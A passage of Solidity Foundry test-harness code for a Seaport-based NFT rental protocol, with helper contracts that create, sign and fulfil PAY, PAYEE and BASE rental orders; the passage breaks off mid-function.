      usedOfferERC721s.push();\n                usedConsiderationERC721s.push();\n\n                usedOfferERC1155s.push();\n                usedConsiderationERC1155s.push();\n            }\n        }\n\n        /////////////////////////////////////////////////////////////////////////////////\n        //                                Order Creation                               //\n        /////////////////////////////////////////////////////////////////////////////////\n\n        // creates an order based on the provided context. The defaults on this order\n        // are good for most test cases.\n        function createOrder(\n            ProtocolAccount memory offerer,\n            OrderType orderType,\n            uint256 erc721Offers,\n            uint256 erc1155Offers,\n            uint256 erc20Offers,\n            uint256 erc721Considerations,\n            uint256 erc1155Considerations,\n            uint256 erc20Considerations\n        ) internal {\n            // require that the number of offer items or consideration items\n            // dont exceed the number of test tokens\n            require(\n                erc721Offers <= erc721s.length &&\n                    erc721Offers <= erc1155s.length &&\n                    erc20Offers <= erc20s.length,\n                \"TEST: too many offer items defined\"\n            );\n            require(\n                erc721Considerations <= erc721s.length &&\n                    erc1155Considerations <= erc1155s.length &&\n                    erc20Considerations <= erc20s.length,\n                \"TEST: too many consideration items defined\"\n            );\n\n            // create the offerer\n            _createOfferer(offerer);\n\n            // add the offer items\n            _createOfferItems(erc721Offers, erc1155Offers, erc20Offers);\n\n            // create the consideration items\n            _createConsiderationItems(\n                erc721Considerations,\n                erc1155Considerations,\n                erc20Considerations\n            );\n\n            // Create order metadata\n            _createOrderMetadata(orderType);\n        }\n\n        // Creates an offerer on the order to create\n        function _createOfferer(ProtocolAccount memory offerer) private {\n            orderToCreate.offerer = offerer;\n        }\n\n        // Creates offer items which are good for most tests\n        function _createOfferItems(\n            uint256 erc721Offers,\n            uint256 erc1155Offers,\n            uint256 erc20Offers\n        ) private {\n            // generate the ERC721 offer items\n            for (uint256 i = 0; i < erc721Offers; ++i) {\n                // create the offer item\n                orderToCreate.offerItems.push(\n                    OfferItemLib\n                        .empty()\n                        .withItemType(ItemType.ERC721)\n                        .withToken(address(erc721s[i]))\n                        .withIdentifierOrCriteria(usedOfferERC721s[i])\n                        .withStartAmount(1)\n                        .withEndAmount(1)\n                );\n\n                // mint an erc721 to the offerer\n                erc721s[i].mint(orderToCreate.offerer.addr);\n\n                // update the used token so it cannot be used again in the same test\n                usedOfferERC721s[i]++;\n            }\n\n            // generate the ERC1155 offer items\n            for (uint256 i = 0; i < erc1155Offers; ++i) {\n                // create the offer item\n                orderToCreate.offerItems.push(\n                    OfferItemLib\n                        .empty()\n                        .withItemType(ItemType.ERC1155)\n                        .withToken(address(erc1155s[i]))\n                        .withIdentifierOrCriteria(usedOfferERC1155s[i])\n                        .withStartAmount(100)\n                        .withEndAmount(100)\n                );\n\n                // mint an erc1155 to the offerer\n                erc1155s[i].mint(orderToCreate.offerer.addr, 100);\n\n                // update the used token so it cannot be used again in the same test\n                usedOfferERC1155s[i]++;\n            }\n\n            // generate the ERC20 offer items\n            for (uint256 i = 0; i < erc20Offers; ++i) {\n                // create the offer item\n                orderToCreate.offerItems.push(\n                    OfferItemLib\n                        .empty()\n                        .withItemType(ItemType.ERC20)\n                        .withToken(address(erc20s[i]))\n                        .withStartAmount(100)\n                        .withEndAmount(100)\n                );\n            }\n        }\n\n        // Creates consideration items that are good for most tests\n        function _createConsiderationItems(\n            uint256 erc721Considerations,\n            uint256 erc1155Considerations,\n            uint256 erc20Considerations\n        ) private {\n            // generate the ERC721 consideration items\n            for (uint256 i = 0; i < erc721Considerations; ++i) {\n                // create the consideration item, and set the recipient as the offerer's\n                // rental safe address\n                orderToCreate.considerationItems.push(\n                    ConsiderationItemLib\n                        .empty()\n                        .withRecipient(address(orderToCreate.offerer.safe))\n                        .withItemType(ItemType.ERC721)\n                        .withToken(address(erc721s[i]))\n                        .withIdentifierOrCriteria(usedConsiderationERC721s[i])\n                        .withStartAmount(1)\n                        .withEndAmount(1)\n                );\n\n                // update the used token so it cannot be used again in the same test\n                usedConsiderationERC721s[i]++;\n            }\n\n            // generate the ERC1155 consideration items\n            for (uint256 i = 0; i < erc1155Considerations; ++i) {\n                // create the consideration item, and set the recipient as the offerer's\n                // rental safe address\n                orderToCreate.considerationItems.push(\n                    ConsiderationItemLib\n                        .empty()\n                        .withRecipient(address(orderToCreate.offerer.safe))\n                        .withItemType(ItemType.ERC1155)\n                        .withToken(address(erc1155s[i]))\n                        .withIdentifierOrCriteria(usedConsiderationERC1155s[i])\n                        .withStartAmount(100)\n                        .withEndAmount(100)\n                );\n\n                // update the used token so it cannot be used again in the same test\n                usedConsiderationERC1155s[i]++;\n            }\n\n            // generate the ERC20 consideration items\n            for (uint256 i = 0; i < erc20Considerations; ++i) {\n                // create the offer item\n                orderToCreate.considerationItems.push(\n                    ConsiderationItemLib\n                        .empty()\n                        .withRecipient(address(ESCRW))\n                        .withItemType(ItemType.ERC20)\n                        .withToken(address(erc20s[i]))\n                        .withStartAmount(100)\n                        .withEndAmount(100)\n                );\n            }\n        }\n\n        // Creates a order metadata that is good for most tests\n        function _createOrderMetadata(OrderType orderType) private {\n            // Create order metadata\n            orderToCreate.metadata.orderType = orderType;\n            orderToCreate.metadata.rentDuration = 500;\n            orderToCreate.metadata.emittedExtraData = new bytes(0);\n        }\n\n        // creates a signed seaport order ready to be fulfilled by a renter\n        function _createSignedOrder(\n            ProtocolAccount memory _offerer,\n            OfferItem[] memory _offerItems,\n            ConsiderationItem[] memory _considerationItems,\n            OrderMetadata memory _metadata\n        ) private view returns (Order memory order, bytes32 orderHash) {\n            // Build the order components\n            OrderComponents memory orderComponents = OrderComponentsLib\n                .fromDefault(STANDARD_ORDER_COMPONENTS)\n                .withOfferer(_offerer.addr)\n                .withOffer(_offerItems)\n                .withConsideration(_considerationItems)\n                .withZoneHash(create.getOrderMetadataHash(_metadata))\n                .withCounter(seaport.getCounter(_offerer.addr));\n\n            // generate the order hash\n            orderHash = seaport.getOrderHash(orderComponents);\n\n            // generate the signature for the order components\n            bytes memory signature = _signSeaportOrder(_offerer.privateKey, orderHash);\n\n            // create the order, but dont provide a signature if its a PAYEE order.\n            // Since PAYEE orders are fulfilled by the offerer of the order, they\n            // dont need a signature.\n            if (_metadata.orderType == OrderType.PAYEE) {\n                order = OrderLib.empty().withParameters(orderComponents.toOrderParameters());\n            } else {\n                order = OrderLib\n                    .empty()\n                    .withParameters(orderComponents.toOrderParameters())\n                    .withSignature(signature);\n            }\n        }\n\n        function _signSeaportOrder(\n            uint256 signerPrivateKey,\n            bytes32 orderHash\n        ) private view returns (bytes memory signature) {\n            // fetch domain separator from seaport\n            (, bytes32 domainSeparator, ) = seaport.information();\n\n            // sign the EIP-712 digest\n            (uint8 v, bytes32 r, bytes32 s) = vm.sign(\n                signerPrivateKey,\n                domainSeparator.toTypedDataHash(orderHash)\n            );\n\n            // encode the signature\n            signature = abi.encodePacked(r, s, v);\n        }\n\n        /////////////////////////////////////////////////////////////////////////////////\n        //                               Order Amendments                              //\n        /////////////////////////////////////////////////////////////////////////////////\n\n        function resetOrderToCreate() internal {\n            delete orderToCreate;\n        }\n\n        function withOfferer(ProtocolAccount memory _offerer) internal {\n            orderToCreate.offerer = _offerer;\n        }\n\n        function resetOfferer() internal {\n            delete orderToCreate.offerer;\n        }\n\n        function withReplacedOfferItems(OfferItem[] memory _offerItems) internal {\n            // reset all current offer items\n            resetOfferItems();\n\n            // add the new offer items to storage\n            for (uint256 i = 0; i < _offerItems.length; i++) {\n                orderToCreate.offerItems.push(_offerItems[i]);\n            }\n        }\n\n        function withOfferItem(OfferItem memory offerItem) internal {\n            orderToCreate.offerItems.push(offerItem);\n        }\n\n        function resetOfferItems() internal {\n            delete orderToCreate.offerItems;\n        }\n\n        function popOfferItem() internal {\n            orderToCreate.offerItems.pop();\n        }\n\n        function withReplacedConsiderationItems(\n            ConsiderationItem[] memory _considerationItems\n        ) internal {\n            // reset all current consideration items\n            resetConsiderationItems();\n\n            // add the new consideration items to storage\n            for (uint256 i = 0; i < _considerationItems.length; i++) {\n                orderToCreate.considerationItems.push(_considerationItems[i]);\n            }\n        }\n\n        function withConsiderationItem(ConsiderationItem memory considerationItem) internal {\n            orderToCreate.considerationItems.push(considerationItem);\n        }\n\n        function resetConsiderationItems() internal {\n            delete orderToCreate.considerationItems;\n        }\n\n        function popConsiderationItem() internal {\n            orderToCreate.considerationItems.pop();\n        }\n\n        function withHooks(Hook[] memory hooks) internal {\n            // delete the current metatdata hooks\n            delete orderToCreate.metadata.hooks;\n\n            // add each metadata hook to storage\n            for (uint256 i = 0; i < hooks.length; i++) {\n                orderToCreate.metadata.hooks.push(hooks[i]);\n            }\n        }\n\n        function withOrderMetadata(OrderMetadata memory _metadata) internal {\n            // update the static metadata parameters\n            orderToCreate.metadata.orderType = _metadata.orderType;\n            orderToCreate.metadata.rentDuration = _metadata.rentDuration;\n            orderToCreate.metadata.emittedExtraData = _metadata.emittedExtraData;\n\n            // update the hooks\n            withHooks(_metadata.hooks);\n        }\n\n        function resetOrderMetadata() internal {\n            delete orderToCreate.metadata;\n        }\n\n        /////////////////////////////////////////////////////////////////////////////////\n        //                              Order Finalization                             //\n        /////////////////////////////////////////////////////////////////////////////////\n\n        function finalizeOrder()\n            internal\n            returns (Order memory, bytes32, OrderMetadata memory)\n        {\n            // create and sign the order\n            (Order memory order, bytes32 orderHash) = _createSignedOrder(\n                orderToCreate.offerer,\n                orderToCreate.offerItems,\n                orderToCreate.considerationItems,\n                orderToCreate.metadata\n            );\n\n            // pull order metadata into memory\n            OrderMetadata memory metadata = orderToCreate.metadata;\n\n            // clear structs\n            resetOrderToCreate();\n\n            return (order, orderHash, metadata);\n        }\n    }\n\n\n    // Sets up logic in the test engine related to order fulfillment\n    // Borrowed from test/fixtures/engine/OrderFulfiller\n    contract OrderFulfiller is OrderCreator {\n        using ECDSA for bytes32;\n\n        struct OrderToFulfill {\n            bytes32 orderHash;\n            RentPayload payload;\n            AdvancedOrder advancedOrder;\n        }\n\n        // components of a fulfillment\n        ProtocolAccount fulfiller;\n        OrderToFulfill[] ordersToFulfill;\n        Fulfillment[] seaportMatchOrderFulfillments;\n        FulfillmentComponent[][] seaportOfferFulfillments;\n        FulfillmentComponent[][] seaportConsiderationFulfillments;\n        address seaportRecipient;\n\n        /////////////////////////////////////////////////////////////////////////////////\n        //                             Fulfillment Creation                            //\n        /////////////////////////////////////////////////////////////////////////////////\n\n        // creates an order fulfillment\n        function createOrderFulfillment(\n            ProtocolAccount memory _fulfiller,\n            Order memory order,\n            bytes32 orderHash,\n            OrderMetadata memory metadata\n        ) internal {\n            // set the fulfiller account\n            fulfiller = _fulfiller;\n\n            // set the recipient of any offer items after an order is fulfilled. If the fulfillment is via\n            // `matchAdvancedOrders`, then any unspent offer items will go to this address as well\n            seaportRecipient = address(_fulfiller.safe);\n\n            // get a pointer to a new order to fulfill\n            OrderToFulfill storage orderToFulfill = ordersToFulfill.push();\n\n            // create an order fulfillment\n            OrderFulfillment memory fulfillment = OrderFulfillment(address(_fulfiller.safe));\n\n            // add the order hash and fulfiller\n            orderToFulfill.orderHash = orderHash;\n\n            // create rental zone payload data\n            _createRentalPayload(\n                orderToFulfill.payload,\n                RentPayload(fulfillment, metadata, block.timestamp + 100, _fulfiller.addr)\n            );\n\n            // generate the signature for the payload\n            bytes memory signature = _signProtocolOrder(\n                rentalSigner.privateKey,\n                create.getRentPayloadHash(orderToFulfill.payload)\n            );\n\n            // create an advanced order from the order. Pass the rental\n            // payload as extra data\n            _createAdvancedOrder(\n                orderToFulfill.advancedOrder,\n                AdvancedOrder(\n                    order.parameters,\n                    1,\n                    1,\n                    order.signature,\n                    abi.encode(orderToFulfill.payload, signature)\n                )\n            );\n        }\n\n        function _createOrderFulfiller(\n            ProtocolAccount storage storageFulfiller,\n            ProtocolAccount memory _fulfiller\n        ) private {\n            storageFulfiller.addr = _fulfiller.addr;\n            storageFulfiller.safe = _fulfiller.safe;\n            storageFulfiller.publicKeyX = _fulfiller.publicKeyX;\n            storageFulfiller.publicKeyY = _fulfiller.publicKeyY;\n            storageFulfiller.privateKey = _fulfiller.privateKey;\n        }\n\n        function _createOrderFulfillment(\n            OrderFulfillment storage storageFulfillment,\n            OrderFulfillment memory fulfillment\n        ) private {\n            storageFulfillment.recipient = fulfillment.recipient;\n        }\n\n        function _createOrderMetadata(\n            OrderMetadata storage storageMetadata,\n            OrderMetadata memory metadata\n        ) private {\n            // Create order metadata in storage\n            storageMetadata.orderType = metadata.orderType;\n            storageMetadata.rentDuration = metadata.rentDuration;\n            storageMetadata.emittedExtraData = metadata.emittedExtraData;\n\n            // dynamically push the hooks from memory to storage\n            for (uint256 i = 0; i < metadata.hooks.length; i++) {\n                storageMetadata.hooks.push(metadata.hooks[i]);\n            }\n        }\n\n        function _createRentalPayload(\n            RentPayload storage storagePayload,\n            RentPayload memory payload\n        ) private {\n            // set payload fulfillment on the order to fulfill\n            _createOrderFulfillment(storagePayload.fulfillment, payload.fulfillment);\n\n            // set payload metadata on the order to fulfill\n            _createOrderMetadata(storagePayload.metadata, payload.metadata);\n\n            // set payload expiration on the order to fulfill\n            storagePayload.expiration = payload.expiration;\n\n            // set payload intended fulfiller on the order to fulfill\n            storagePayload.intendedFulfiller = payload.intendedFulfiller;\n        }\n\n        function _createAdvancedOrder(\n            AdvancedOrder storage storageAdvancedOrder,\n            AdvancedOrder memory advancedOrder\n        ) private {\n            // create the order parameters on the order to fulfill\n            _createOrderParameters(storageAdvancedOrder.parameters, advancedOrder.parameters);\n\n            // create the rest of the static parameters on the order to fulfill\n            storageAdvancedOrder.numerator = advancedOrder.numerator;\n            storageAdvancedOrder.denominator = advancedOrder.denominator;\n            storageAdvancedOrder.signature = advancedOrder.signature;\n            storageAdvancedOrder.extraData = advancedOrder.extraData;\n        }\n\n        function _createOrderParameters(\n            OrderParameters storage storageOrderParameters,\n            OrderParameters memory orderParameters\n        ) private {\n            // create the static order parameters for the order to fulfill\n            storageOrderParameters.offerer = orderParameters.offerer;\n            storageOrderParameters.zone = orderParameters.zone;\n            storageOrderParameters.orderType = orderParameters.orderType;\n            storageOrderParameters.startTime = orderParameters.startTime;\n            storageOrderParameters.endTime = orderParameters.endTime;\n            storageOrderParameters.zoneHash = orderParameters.zoneHash;\n            storageOrderParameters.salt = orderParameters.salt;\n            storageOrderParameters.conduitKey = orderParameters.conduitKey;\n            storageOrderParameters.totalOriginalConsiderationItems = orderParameters\n                .totalOriginalConsiderationItems;\n\n            // create the dynamic order parameters for the order to fulfill\n            for (uint256 i = 0; i < orderParameters.offer.length; i++) {\n                storageOrderParameters.offer.push(orderParameters.offer[i]);\n            }\n            for (uint256 i = 0; i < orderParameters.consideration.length; i++) {\n                storageOrderParameters.consideration.push(orderParameters.consideration[i]);\n            }\n        }\n\n        function _createSeaportFulfillment(\n            Fulfillment storage storageFulfillment,\n            Fulfillment memory fulfillment\n        ) private {\n            // push the offer components to storage\n            for (uint256 i = 0; i < fulfillment.offerComponents.length; i++) {\n                storageFulfillment.offerComponents.push(fulfillment.offerComponents[i]);\n            }\n\n            // push the consideration components to storage\n            for (uint256 i = 0; i < fulfillment.considerationComponents.length; i++) {\n                storageFulfillment.considerationComponents.push(\n                    fulfillment.considerationComponents[i]\n                );\n            }\n        }\n\n        function _seaportItemTypeToRentalItemType(\n            SeaportItemType seaportItemType\n        ) internal pure returns (RentalItemType) {\n            if (seaportItemType == SeaportItemType.ERC20) {\n                return RentalItemType.ERC20;\n            } else if (seaportItemType == SeaportItemType.ERC721) {\n                return RentalItemType.ERC721;\n            } else if (seaportItemType == SeaportItemType.ERC1155) {\n                return RentalItemType.ERC1155;\n            } else {\n                revert(\"seaport item type not supported\");\n            }\n        }\n\n        function _createRentalOrder(\n            OrderToFulfill memory orderToFulfill\n        ) internal view returns (RentalOrder memory rentalOrder) {\n            // get the order parameters\n            OrderParameters memory parameters = orderToFulfill.advancedOrder.parameters;\n\n            // get the payload\n            RentPayload memory payload = orderToFulfill.payload;\n\n            // get the metadata\n            OrderMetadata memory metadata = payload.metadata;\n\n            // construct a rental order\n            rentalOrder = RentalOrder({\n                seaportOrderHash: orderToFulfill.orderHash,\n                items: new Item[](parameters.offer.length + parameters.consideration.length),\n                hooks: metadata.hooks,\n                orderType: metadata.orderType,\n                lender: parameters.offerer,\n                renter: payload.intendedFulfiller,\n                rentalWallet: payload.fulfillment.recipient,\n                startTimestamp: block.timestamp,\n                endTimestamp: block.timestamp + metadata.rentDuration\n            });\n\n            // for each new offer item being rented, create a new item struct to add to the rental order\n            for (uint256 i = 0; i < parameters.offer.length; i++) {\n                // PAYEE orders cannot have offer items\n                require(\n                    metadata.orderType != OrderType.PAYEE,\n                    \"TEST: cannot have offer items in PAYEE order\"\n                );\n\n                // get the offer item\n                OfferItem memory offerItem = parameters.offer[i];\n\n                // determine the item type\n                RentalItemType itemType = _seaportItemTypeToRentalItemType(offerItem.itemType);\n\n                // determine which entity the payment will settle to\n                SettleTo settleTo = offerItem.itemType == SeaportItemType.ERC20\n                    ? SettleTo.RENTER\n                    : SettleTo.LENDER;\n\n                // create a new rental item\n                rentalOrder.items[i] = Item({\n                    itemType: itemType,\n                    settleTo: settleTo,\n                    token: offerItem.token,\n                    amount: offerItem.startAmount,\n                    identifier: offerItem.identifierOrCriteria\n                });\n            }\n\n            // for each consideration item in return, create a new item struct to add to the rental order\n            for (uint256 i = 0; i < parameters.consideration.length; i++) {\n                // PAY orders cannot have consideration items\n                require(\n                    metadata.orderType != OrderType.PAY,\n                    \"TEST: cannot have consideration items in PAY order\"\n                );\n\n                // get the offer item\n                ConsiderationItem memory considerationItem = parameters.consideration[i];\n\n                // determine the item type\n                RentalItemType itemType = _seaportItemTypeToRentalItemType(\n                    considerationItem.itemType\n                );\n\n                // determine which entity the payment will settle to\n                SettleTo settleTo = metadata.orderType == OrderType.PAYEE &&\n                    considerationItem.itemType == SeaportItemType.ERC20\n                    ? SettleTo.RENTER\n                    : SettleTo.LENDER;\n\n                // calculate item index offset\n                uint256 itemIndex = i + parameters.offer.length;\n\n                // create a new payment item\n                rentalOrder.items[itemIndex] = Item({\n                    itemType: itemType,\n                    settleTo: settleTo,\n                    token: considerationItem.token,\n                    amount: considerationItem.startAmount,\n                    identifier: considerationItem.identifierOrCriteria\n                });\n            }\n        }\n\n        function _signProtocolOrder(\n            uint256 signerPrivateKey,\n            bytes32 payloadHash\n        ) internal view returns (bytes memory signature) {\n            // fetch domain separator from create policy\n            bytes32 domainSeparator = create.domainSeparator();\n\n            // sign the EIP-712 digest\n            (uint8 v, bytes32 r, bytes32 s) = vm.sign(\n                signerPrivateKey,\n                domainSeparator.toTypedDataHash(payloadHash)\n            );\n\n            // encode the signature\n            signature = abi.encodePacked(r, s, v);\n        }\n\n        /////////////////////////////////////////////////////////////////////////////////\n        //                            Fulfillment Amendments                           //\n        /////////////////////////////////////////////////////////////////////////////////\n\n        function withFulfiller(ProtocolAccount memory _fulfiller) internal {\n            fulfiller = _fulfiller;\n        }\n\n        function withRecipient(address _recipient) internal {\n            seaportRecipient = _recipient;\n        }\n\n        function withAdvancedOrder(\n            AdvancedOrder memory _advancedOrder,\n            uint256 orderIndex\n        ) internal {\n            // get a storage pointer to the order to fulfill\n            OrderToFulfill storage orderToFulfill = ordersToFulfill[orderIndex];\n\n            // set the new advanced order\n            _createAdvancedOrder(orderToFulfill.advancedOrder, _advancedOrder);\n        }\n\n        function withSeaportMatchOrderFulfillment(Fulfillment memory _fulfillment) internal {\n            // get a pointer to a new seaport fulfillment\n            Fulfillment storage fulfillment = seaportMatchOrderFulfillments.push();\n\n            // set the fulfillment\n            _createSeaportFulfillment(\n                fulfillment,\n                Fulfillment({\n                    offerComponents: _fulfillment.offerComponents,\n                    considerationComponents: _fulfillment.considerationComponents\n                })\n            );\n        }\n\n        function withSeaportMatchOrderFulfillments(\n            Fulfillment[] memory fulfillments\n        ) internal {\n            // reset all current seaport match order fulfillments\n            resetSeaportMatchOrderFulfillments();\n\n            // add the new offer items to storage\n            for (uint256 i = 0; i < fulfillments.length; i++) {\n                // get a pointer to a new seaport fulfillment\n                Fulfillment storage fulfillment = seaportMatchOrderFulfillments.push();\n\n                // set the fulfillment\n                _createSeaportFulfillment(\n                    fulfillment,\n                    Fulfillment({\n                        offerComponents: fulfillments[i].offerComponents,\n                        considerationComponents: fulfillments[i].considerationComponents\n                    })\n                );\n            }\n        }\n\n        function withBaseOrderFulfillmentComponents() internal {\n            // create offer fulfillments. We need to specify which offer items can be aggregated\n            // into one transaction. For example, 2 different orders where the same seller is offering\n            // the same item in each.\n            //\n            // Since BASE orders will only contain ERC721 offer items, these cannot be aggregated. So, a separate fulfillment\n            // is created for each order.\n            for (uint256 i = 0; i < ordersToFulfill.length; i++) {\n                // get a pointer to a new offer fulfillment array. This array will contain indexes of\n                // orders and items which are all grouped on whether they can be combined in a single transferFrom()\n                FulfillmentComponent[] storage offerFulfillments = seaportOfferFulfillments\n                    .push();\n\n                // number of offer items in the order\n                uint256 offerItemsInOrder = ordersToFulfill[i]\n                    .advancedOrder\n                    .parameters\n                    .offer\n                    .length;\n\n                // add a single fulfillment component for each offer item in the order\n                for (uint256 j = 0; j < offerItemsInOrder; j++) {\n                    offerFulfillments.push(\n                        FulfillmentComponent({orderIndex: i, itemIndex: j})\n                    );\n                }\n            }\n\n            // create consideration fulfillments. We need to specify which consideration items can be aggregated\n            // into one transaction. For example, 3 different orders where the same fungible consideration items are\n            // expected in return.\n            //\n            // get a pointer to a new offer fulfillment array. This array will contain indexes of\n            // orders and items which are all grouped on whether they can be combined in a single transferFrom()\n            FulfillmentComponent[]\n                storage considerationFulfillments = seaportConsiderationFulfillments.push();\n\n            // BASE orders will only contain ERC20 items, these are fungible and are candidates for aggregation. Because\n            // all of these BASE orders will be fulfilled by the same EOA, and all ERC20 consideration items are going to the\n            // ESCRW contract, the consideration items can be aggregated. In other words, Seaport will only make a single transfer\n            // of ERC20 tokens from the fulfiller EOA to the payment escrow contract.\n            //\n            // put all fulfillments into one which can be an aggregated transfer\n            for (uint256 i = 0; i < ordersToFulfill.length; i++) {\n                considerationFulfillments.push(\n                    FulfillmentComponent({orderIndex: i, itemIndex: 0})\n                );\n            }\n        }\n\n        function withLinkedPayAndPayeeOrders(\n            uint256 payOrderIndex,\n            uint256 payeeOrderIndex\n        ) internal {\n            // get the PAYEE order\n            OrderParameters memory payeeOrder = ordersToFulfill[payeeOrderIndex]\n                .advancedOrder\n                .parameters;\n\n            // For each consideration item in the PAYEE order, a fulfillment should be\n            // constructed with a corresponding item from the PAY order's offer items.\n            for (uint256 i = 0; i < payeeOrder.consideration.length; ++i) {\n                // define the offer components\n                FulfillmentComponent[] memory offerComponents = new FulfillmentComponent[](1);\n                offerComponents[0] = FulfillmentComponent({\n                    orderIndex: payOrderIndex,\n                    itemIndex: i\n                });\n\n                // define the consideration components\n                FulfillmentComponent[]\n                    memory considerationComponents = new FulfillmentComponent[](1);\n                considerationComponents[0] = FulfillmentComponent({\n                    orderIndex: payeeOrderIndex,\n                    itemIndex: i\n                });\n\n                // get a pointer to a new seaport fulfillment\n                Fulfillment storage fulfillment = seaportMatchOrderFulfillments.push();\n\n                // set the fulfillment\n                _createSeaportFulfillment(\n                    fulfillment,\n                    Fulfillment({\n                        offerComponents: offerComponents,\n                        considerationComponents: considerationComponents\n                    })\n                );\n            }\n        }\n\n        function resetFulfiller() internal {\n            delete fulfiller;\n        }\n\n        function resetOrdersToFulfill() internal {\n            delete ordersToFulfill;\n        }\n\n        function resetSeaportMatchOrderFulfillments() internal {\n            delete seaportMatchOrderFulfillments;\n        }\n\n        /////////////////////////////////////////////////////////////////////////////////\n        //                           Fulfillment Finalization                          //\n        /////////////////////////////////////////////////////////////////////////////////\n\n        function _finalizePayOrderFulfillment(\n            bytes memory expectedError\n        )\n            private\n            returns (RentalOrder memory payRentalOrder, RentalOrder memory payeeRentalOrder)\n        {\n            // get the orders to fulfill\n            OrderToFulfill memory payOrder = ordersToFulfill[0];\n            OrderToFulfill memory payeeOrder = ordersToFulfill[1];\n\n            // create rental orders\n            payRentalOrder = _createRentalOrder(payOrder);\n            payeeRentalOrder = _createRentalOrder(payeeOrder);\n\n            // expect an error if error data was provided\n            if (expectedError.length != 0) {\n                vm.expectRevert(expectedError);\n            }\n            // otherwise, expect the relevant event to be emitted.\n            else {\n                vm.expectEmit({emitter: address(create)});\n                emit Events.RentalOrderStarted(\n                    create.getRentalOrderHash(payRentalOrder),\n                    payOrder.payload.metadata.emittedExtraData,\n                    payRentalOrder.seaportOrderHash,\n                    payRentalOrder.items,\n                    payRentalOrder.hooks,\n                    payRentalOrder.orderType,\n                    payRentalOrder.lender,\n                    payRentalOrder.renter,\n                    payRentalOrder.rentalWallet,\n                    payRentalOrder.startTimestamp,\n                    payRentalOrder.endTimestamp\n                );\n            }\n\n            // the offerer of the PAYEE order fulfills the orders.\n            vm.prank(fulfiller.addr);\n\n            // fulfill the orders\n            seaport.matchAdvancedOrders(\n                _deconstructOrdersToFulfill(),\n                new CriteriaResolver[](0),\n                seaportMatchOrderFulfillments,\n                seaportRecipient\n            );\n\n            // clear structs\n            resetFulfiller();\n            resetOrdersToFulfill();\n            resetSeaportMatchOrderFulfillments();\n        }\n\n        function finalizePayOrderFulfillment()\n            internal\n            returns (RentalOrder memory payRentalOrder, RentalOrder memory payeeRentalOrder)\n        {\n            (payRentalOrder, payeeRentalOrder) = _finalizePayOrderFulfillment(bytes(\"\"));\n        }\n\n        function finalizePayOrderFulfillmentWithError(\n            bytes memory expectedError\n        )\n            internal\n            returns (RentalOrder memory payRentalOrder, RentalOrder memory payeeRentalOrder)\n        {\n            (payRentalOrder, payeeRentalOrder) = _finalizePayOrderFulfillment(expectedError);\n        }\n\n        function _finalizeBaseOrderFulfillment(\n            bytes memory expectedError\n        ) private returns (RentalOrder memory rentalOrder) {\n            // get the order to fulfill\n            OrderToFulfill memory baseOrder = ordersToFulfill[0];\n\n            // create a rental order\n            rentalOrder = _createRentalOrder(baseOrder);\n\n            // expect an error if error data was provided\n            if (expectedError.length != 0) {\n                vm.expectRevert(expectedError);\n            }\n            // otherwise, expect the relevant event to be emitted.\n            else {\n                vm.expectEmit({emitter: address(create)});\n                emit Events.RentalOrderStarted(\n                    create.getRentalOrderHash(rentalOrder),\n                    baseOrder.payload.metadata.emittedExtraData,\n                    rentalOrder.seaportOrderHash,\n                    rentalOrder.items,\n                    rentalOrder.hooks,\n                    rentalOrder.orderType,\n                    rentalOrder.lender,\n                    rentalOrder.renter,\n                    rentalOrder.rentalWallet,\n                    rentalOrder.startTimestamp,\n                    rentalOrder.endTimestamp\n                );\n            }\n\n            // the owner of the rental wallet fulfills the advanced order, and marks the rental wallet\n            // as the recipient\n            vm.prank(fulfiller.addr);\n            seaport.fulfillAdvancedOrder(\n                baseOrder.advancedOrder,\n                new CriteriaResolver[](0),\n                conduitKey,\n                seaportRecipient\n            );\n\n            // clear structs\n            resetFulfiller();\n            resetOrdersToFulfill();\n            resetSeaportMatchOrderFulfillments();\n        }\n\n        function finalizeBaseOrderFulfillment()\n            internal\n            returns (RentalOrder memory rentalOrder)\n        {\n            rentalOrder = _finalizeBaseOrderFulfillment(bytes(\"\"));\n        }\n\n        function finalizeBaseOrderFulfillmentWithError(\n            bytes memory expectedError\n        ) internal returns (RentalOrder memory rentalOrder) {\n            rentalOrder = _finalizeBaseOrderFulfillment(expectedError);\n        }\n\n        function finalizeBaseOrdersFulfillment()\n            internal\n            returns (RentalOrder[] memory rentalOrders)\n        {\n            // Instantiate rental orders\n            uint256 numOrdersToFulfill = ordersToFulfill.length;\n            rentalOrders = new RentalOrder[](numOrdersToFulfill);\n\n            // convert each order to fulfill into a rental order\n            for (uint256 i = 0; i < numOrdersToFulfill; i++) {\n                rentalOrders[i] = _createRentalOrder(ordersToFulfill[i]);\n            }\n\n            // Expect the relevant events to be emitted.\n            for (uint256 i = 0; i < rentalOrders.length; i++) {\n                vm.expectEmit({emitter: address(create)});\n                emit Events.RentalOrderStarted(\n                    create.getRentalOrderHash(rentalOrders[i]),\n                    ordersToFulfill[i].payload.metadata.emittedExtraData,\n                    rentalOrders[i].seaportOrderHash,\n                    rentalOrders[i].items,\n                    rentalOrders[i].hooks,\n                    rentalOrders[i].orderType,\n                    rentalOrders[i].lender,\n                    rentalOrders[i].renter,\n                    rentalOrders[i].rentalWallet,\n                    rentalOrders[i].startTimestamp,\n                    rentalOrders[i].endTimestamp\n                );\n            }\n\n            // the owner of the rental wallet fulfills the advanced orders, and marks the rental wallet\n            // as the recipient\n            vm.prank(fulfiller.addr);\n            seaport.fulfillAvailableAdvancedOrders(\n                _deconstructOrdersToFulfill(),\n                new CriteriaResolver[](0),\n                seaportOfferFulfillments,\n                seaportConsiderationFulfillments,\n                conduitKey,\n                seaportRecipient,\n                ordersToFulfill.length\n            );\n\n            // clear structs\n            resetFulfiller();\n            resetOrdersToFulfill();\n            resetSeaportMatchOrderFulfillments();\n        }\n\n        function finalizePayOrdersFulfillment()\n            internal\n            returns (RentalOrder[] memory rentalOrders)\n        {\n            // Instantiate rental orders\n            uint256 numOrdersToFulfill = ordersToFulfill.length;\n            rentalOrders = new RentalOrder[](numOrdersToFulfill);\n\n            // convert each order to fulfill into a rental order\n            for (uint256 i = 0; i < numOrdersToFulfill; i++) {\n                rentalOrders[i] = _createRentalOrder(ordersToFulfill[i]);\n            }\n\n            // Expect the relevant events to be emitted.\n            for (uint256 i = 0; i < rentalOrders.length; i++) {\n                // only expect the event if its a PAY order\n                if (ordersToFulfill[i].payload.metadata.orderType == OrderType.PAY) {\n                    vm.expectEmit({emitter: address(create)});\n                    emit Events.RentalOrderStarted(\n                        create.getRentalOrderHash(rentalOrders[i]),\n                        ordersToFulfill[i].payload.metadata.emittedExtraData,\n                        rentalOrders[i].seaportOrderHash,\n                        rentalOrders[i].items,\n                        